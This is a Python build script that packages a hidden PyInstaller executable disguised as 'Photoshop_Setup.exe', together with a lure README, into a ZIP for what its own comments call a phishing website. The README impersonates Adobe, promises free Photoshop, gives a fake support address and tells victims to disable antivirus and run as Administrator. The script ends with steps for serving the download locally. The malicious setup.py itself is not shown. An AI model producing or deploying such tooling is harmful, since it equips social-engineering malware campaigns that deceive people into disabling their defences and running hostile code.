"""
build_payload.py - Builds the malicious payload ZIP file
Run this to create payload.zip for the phishing website.
"""

import os
import sys
import zipfile
import subprocess
import shutil

# ==================== PATHS ====================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TECHNIQUE1_DIR = os.path.join(SCRIPT_DIR, "technique1")
PAYLOAD_CONTENT_DIR = os.path.join(TECHNIQUE1_DIR, "payload_content")
SETUP_PY = os.path.join(PAYLOAD_CONTENT_DIR, "setup.py")
OUTPUT_ZIP = os.path.join(TECHNIQUE1_DIR, "payload.zip")

# ==================== BUILD FUNCTIONS ====================

def clean_old_files():
    """Remove old build artifacts."""
    print("[0/4] Cleaning old build files...")
    
    # Remove old EXE
    old_exe = os.path.join(PAYLOAD_CONTENT_DIR, "Photoshop_Setup.exe")
    if os.path.exists(old_exe):
        os.remove(old_exe)
        print("    [+] Removed old Photoshop_Setup.exe")
    
    # Remove old ZIP
    if os.path.exists(OUTPUT_ZIP):
        os.remove(OUTPUT_ZIP)
        print("    [+] Removed old payload.zip")
    
    # Remove build folder
    build_folder = os.path.join(PAYLOAD_CONTENT_DIR, "build")
    if os.path.exists(build_folder):
        shutil.rmtree(build_folder)
        print("    [+] Removed build folder")
    
    # Remove dist folder
    dist_folder = os.path.join(PAYLOAD_CONTENT_DIR, "dist")
    if os.path.exists(dist_folder):
        shutil.rmtree(dist_folder)
        print("    [+] Removed dist folder")
    
    # Remove spec file
    spec_file = os.path.join(PAYLOAD_CONTENT_DIR, "Photoshop_Setup.spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)
        print("    [+] Removed spec file")
    
    print("    [+] Cleanup complete!")
    print()

def build_exe():
    """Build Photoshop_Setup.exe from setup.py using PyInstaller."""
    print("[1/4] Building Photoshop_Setup.exe...")
    
    if not os.path.exists(SETUP_PY):
        print(f"    [-] ERROR: setup.py not found at:")
        print(f"        {SETUP_PY}")
        return False
    
    print(f"    [*] Source: {SETUP_PY}")
    print(f"    [*] Running PyInstaller...")
    
    # Build EXE with PyInstaller
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "Photoshop_Setup",
        "--distpath", PAYLOAD_CONTENT_DIR,
        "--workpath", os.path.join(PAYLOAD_CONTENT_DIR, "build"),
        "--specpath", PAYLOAD_CONTENT_DIR,
        SETUP_PY
    ]
    
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True,
            cwd=PAYLOAD_CONTENT_DIR
        )
        
        # Check if EXE was created
        exe_path = os.path.join(PAYLOAD_CONTENT_DIR, "Photoshop_Setup.exe")
        
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"    [+] SUCCESS: Photoshop_Setup.exe ({size_mb:.1f} MB)")
            return True
        else:
            print("    [-] FAILED: EXE not created!")
            print()
            print("    PyInstaller Output:")
            print("    " + "-" * 50)
            if result.stdout:
                for line in result.stdout.split('\n')[-20:]:
                    print(f"    {line}")
            if result.stderr:
                print("    Errors:")
                for line in result.stderr.split('\n')[-10:]:
                    print(f"    {line}")
            return False
            
    except FileNotFoundError:
        print("    [-] ERROR: PyInstaller not found!")
        print("    [*] Install with: pip install pyinstaller")
        return False
    except Exception as e:
        print(f"    [-] ERROR: {e}")
        return False

def create_readme():
    """Create README.txt for the ZIP."""
    readme_path = os.path.join(PAYLOAD_CONTENT_DIR, "README.txt")
    readme_content = """
============================================
    Adobe Photoshop CC 2024 - Free Edition
============================================

INSTALLATION INSTRUCTIONS:
--------------------------
1. Run Photoshop_Setup.exe
2. Wait for installation to complete
3. Enjoy your free Photoshop!

TROUBLESHOOTING:
----------------
If installation fails:
- Disable antivirus temporarily
- Run as Administrator
- Ensure you have 4GB free disk space

SUPPORT:
--------
Email: support@adobe-free.com

============================================
"""
    with open(readme_path, "w") as f:
        f.write(readme_content)
    return readme_path

def create_zip():
    """Create payload.zip containing the setup.exe and README."""
    print("[2/4] Creating payload.zip...")
    
    exe_path = os.path.join(PAYLOAD_CONTENT_DIR, "Photoshop_Setup.exe")
    
    if not os.path.exists(exe_path):
        print(f"    [-] ERROR: Photoshop_Setup.exe not found!")
        print(f"        Expected at: {exe_path}")
        return False
    
    # Create README
    readme_path = create_readme()
    
    # Create ZIP
    try:
        with zipfile.ZipFile(OUTPUT_ZIP, "w", zipfile.ZIP_DEFLATED) as zf:
            # Add EXE
            zf.write(exe_path, "Photoshop_Setup.exe")
            print("    [+] Added: Photoshop_Setup.exe")
            
            # Add README
            zf.write(readme_path, "README.txt")
            print("    [+] Added: README.txt")
        
        # Remove temp README
        os.remove(readme_path)
        
        # Show ZIP info
        size_kb = os.path.getsize(OUTPUT_ZIP) / 1024
        print(f"    [+] SUCCESS: payload.zip ({size_kb:.1f} KB)")
        return True
        
    except Exception as e:
        print(f"    [-] ERROR: {e}")
        return False

def cleanup_build_files():
    """Clean up build artifacts after successful build."""
    print("[3/4] Cleaning up build artifacts...")
    
    # Remove build folder
    build_folder = os.path.join(PAYLOAD_CONTENT_DIR, "build")
    if os.path.exists(build_folder):
        shutil.rmtree(build_folder)
        print("    [+] Removed: build/")
    
    # Remove spec file
    spec_file = os.path.join(PAYLOAD_CONTENT_DIR, "Photoshop_Setup.spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)
        print("    [+] Removed: Photoshop_Setup.spec")
    
    print("    [+] Cleanup complete!")

def verify_zip():
    """Verify the ZIP contents."""
    print("[4/4] Verifying payload.zip contents...")
    
    if not os.path.exists(OUTPUT_ZIP):
        print("    [-] ERROR: payload.zip not found!")
        return False
    
    try:
        with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
            files = zf.namelist()
            print(f"    [*] ZIP contains {len(files)} files:")
            
            has_exe = False
            for f in files:
                info = zf.getinfo(f)
                size_kb = info.file_size / 1024
                print(f"        - {f} ({size_kb:.1f} KB)")
                if f == "Photoshop_Setup.exe":
                    has_exe = True
            
            if has_exe:
                print("    [+] VERIFIED: Photoshop_Setup.exe is in ZIP!")
                return True
            else:
                print("    [-] ERROR: Photoshop_Setup.exe NOT found in ZIP!")
                return False
                
    except Exception as e:
        print(f"    [-] ERROR: {e}")
        return False

# ==================== MAIN ====================

def main():
    print()
    print("=" * 60)
    print("    PAYLOAD BUILDER")
    print("    Builds malicious ZIP for phishing website")
    print("=" * 60)
    print()
    
    # Ensure directories exist
    os.makedirs(PAYLOAD_CONTENT_DIR, exist_ok=True)
    
    # Check if setup.py exists
    if not os.path.exists(SETUP_PY):
        print(f"[-] ERROR: setup.py not found!")
        print(f"    Expected: {SETUP_PY}")
        print()
        input("Press Enter to exit...")
        return
    
    print(f"[*] Source file: {SETUP_PY}")
    print(f"[*] Output ZIP:  {OUTPUT_ZIP}")
    print()
    
    # Step 0: Clean old files
    clean_old_files()
    
    # Step 1: Build EXE
    if not build_exe():
        print()
        print("=" * 60)
        print("    BUILD FAILED!")
        print("=" * 60)
        print()
        print("  Possible fixes:")
        print("  1. Install PyInstaller: pip install pyinstaller")
        print("  2. Check setup.py for syntax errors")
        print("  3. Run manually: pyinstaller --onefile setup.py")
        print()
        input("Press Enter to exit...")
        return
    
    print()
    
    # Step 2: Create ZIP
    if not create_zip():
        print()
        print("=" * 60)
        print("    ZIP CREATION FAILED!")
        print("=" * 60)
        input("Press Enter to exit...")
        return
    
    print()
    
    # Step 3: Cleanup
    cleanup_build_files()
    
    print()
    
    # Step 4: Verify
    if not verify_zip():
        print()
        print("=" * 60)
        print("    VERIFICATION FAILED!")
        print("=" * 60)
        input("Press Enter to exit...")
        return
    
    print()
    print("=" * 60)
    print("    ✅ BUILD COMPLETE!")
    print("=" * 60)
    print()
    print(f"  Output: {OUTPUT_ZIP}")
    print(f"  Size:   {os.path.getsize(OUTPUT_ZIP) / 1024:.1f} KB")
    print()
    print("  NEXT STEPS:")
    print("  ─────────────────────────────────────")
    print("  1. cd technique1")
    print("  2. node server.js")
    print("  3. Open http://localhost:3000")
    print("  4. Click Download")
    print("  5. Extract ZIP and run Photoshop_Setup.exe")
    print()
    print("=" * 60)
    print()
    
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()